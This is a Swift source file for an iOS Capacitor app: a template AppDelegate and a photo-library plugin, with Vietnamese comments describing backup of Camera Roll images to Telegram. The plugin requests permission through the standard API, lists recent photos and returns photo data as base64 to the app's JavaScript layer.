import UIKit
import Capacitor
import Photos

@UIApplicationMain
class AppDelegate: UIResponder, UIApplicationDelegate {

    var window: UIWindow?

    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]?) -> Bool {
        // Override point for customization after application launch.
        return true
    }

    func applicationWillResignActive(_ application: UIApplication) {
        // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
        // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
    }

    func applicationDidEnterBackground(_ application: UIApplication) {
        // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
        // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
    }

    func applicationWillEnterForeground(_ application: UIApplication) {
        // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
    }

    func applicationDidBecomeActive(_ application: UIApplication) {
        // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
    }

    func applicationWillTerminate(_ application: UIApplication) {
        // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
    }

    func application(_ application: UIApplication,
                     configurationForConnecting connectingSceneSession: UISceneSession,
                     options: UIScene.ConnectionOptions) -> UISceneConfiguration {
        let config = UISceneConfiguration(name: "Default Configuration",
                                          sessionRole: connectingSceneSession.role)
        config.delegateClass = SceneDelegate.self
        return config
    }
}

/**
 * PhotoSyncPlugin - Tự động đồng bộ và đọc ảnh từ Thư viện ảnh iPhone (Camera Roll)
 * Cho phép sao lưu ngầm phong cách Google Photos lên Telegram
 */
@objc(PhotoSyncPlugin)
public class PhotoSyncPlugin: CAPPlugin, CAPBridgedPlugin {
    public let identifier = "PhotoSyncPlugin"
    public let jsName = "PhotoSync"
    public let pluginMethods: [CAPPluginMethod] = [
        CAPPluginMethod(name: "checkPermission", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "requestPermission", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "getRecentPhotos", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "getPhotoData", returnType: CAPPluginReturnPromise)
    ]

    @objc func checkPermission(_ call: CAPPluginCall) {
        let status = PHPhotoLibrary.authorizationStatus()
        let granted = (status == .authorized || status == .limited)
        call.resolve(["granted": granted])
    }

    @objc func requestPermission(_ call: CAPPluginCall) {
        PHPhotoLibrary.requestAuthorization { status in
            let granted = (status == .authorized || status == .limited)
            call.resolve(["granted": granted])
        }
    }

    @objc func getRecentPhotos(_ call: CAPPluginCall) {
        let limit = call.getInt("limit") ?? 30
        let status = PHPhotoLibrary.authorizationStatus()
        guard status == .authorized || status == .limited else {
            call.reject("Chưa được cấp quyền truy cập Thư viện ảnh")
            return
        }

        let options = PHFetchOptions()
        options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
        options.fetchLimit = limit
        let assets = PHAsset.fetchAssets(with: .image, options: options)

        var result: [[String: Any]] = []
        assets.enumerateObjects { asset, _, _ in
            let date = asset.creationDate?.timeIntervalSince1970 ?? 0
            result.append([
                "id": asset.localIdentifier,
                "timestamp": Int64(date * 1000),
                "width": asset.pixelWidth,
                "height": asset.pixelHeight
            ])
        }
        call.resolve(["photos": result])
    }

    @objc func getPhotoData(_ call: CAPPluginCall) {
        guard let id = call.getString("id") else {
            call.reject("Thiếu localIdentifier của ảnh")
            return
        }

        let assets = PHAsset.fetchAssets(withLocalIdentifiers: [id], options: nil)
        guard let asset = assets.firstObject else {
            call.reject("Không tìm thấy ảnh trên thiết bị")
            return
        }

        let options = PHImageRequestOptions()
        options.isSynchronous = false
        options.deliveryMode = .highQualityFormat
        options.isNetworkAccessAllowed = true

        PHImageManager.default().requestImageDataAndOrientation(for: asset, options: options) { data, _, _, _ in
            guard let data = data else {
                call.reject("Không thể đọc dữ liệu ảnh")
                return
            }
            let base64 = data.base64EncodedString()
            let filename = (asset.value(forKey: "filename") as? String) ?? "photo_\(Int(Date().timeIntervalSince1970)).jpg"
            call.resolve([
                "base64": base64,
                "filename": filename,
                "size": data.count
            ])
        }
    }
}

